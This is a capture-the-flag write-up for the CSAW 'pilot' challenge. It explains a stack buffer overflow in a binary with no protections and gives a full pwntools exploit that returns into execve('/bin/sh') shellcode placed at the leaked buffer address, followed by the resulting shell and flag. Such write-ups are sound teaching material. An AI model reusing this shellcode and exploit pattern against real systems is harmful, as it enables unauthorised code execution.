## Solved by superkojiman

Easy warmup pwnable. Running it shows the following:

```
[*]Welcome DropShip Pilot...
[*]I am your assitant A.I....
[*]I will be guiding you through the tutorial....
[*]As a first step, lets learn how to land at the designated location....
[*]Your mission is to lead the dropship to the right location and execute sequence of instructions to save Marines & Medics...
[*]Good Luck Pilot!....
[*]Location:0x7ffd16d5e720
[*]Command:
```

The address printed is the location of the buffer. It waits for a command and stores our input in said buffer. The binary itself has no protections:

```
|root|csaw|~/work/pwn75-pilot|
# checksec pilotj
[*] '/root/work/pwn75-pilot/pilot'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
```

For 75 points, it's a vanilla buffer overflow. The saved return pointer can be overwritten at offset 40 from the buffer. Here's the exploit. Since the binary doesn't have NX, we can store our shellcode in the buffer and return to it. Here's the exploit: 

```
!/usr/bin/env python

from pwn import *

context(arch="amd64", os="linux")

r = remote("pwn.chal.csaw.io", 8464)

d = r.recv().split("*")
address = d[-2].split(":")[-1][:-2]

print "Address of buffer:", address

# RIP offset is 40 bytes
buf = ""
buf += "jhH\xb8/bin///sPH\x89\xe71\xf6j;X\x99\x0f\x05"
buf += "A"*(40 - len(buf))
buf += p64(int(address, 16))

r.sendline(buf)

print "Let's get shell!"
r.interactive()
```

Running it scores us a shell and the flag:

```
|root|csaw|~/work/pwn75-pilot|
# ./sploit.py
[+] Opening connection to pwn.chal.csaw.io on port 8464: Done
Address of buffer: 0x7ffd51ee01d0
Let's get shell!
[*] Switching to interactive mode
$ ls
flag
pilot
$ cat flag
flag{1nput_c00rd1nat3s_Strap_y0urse1v3s_1n_b0ys}
```
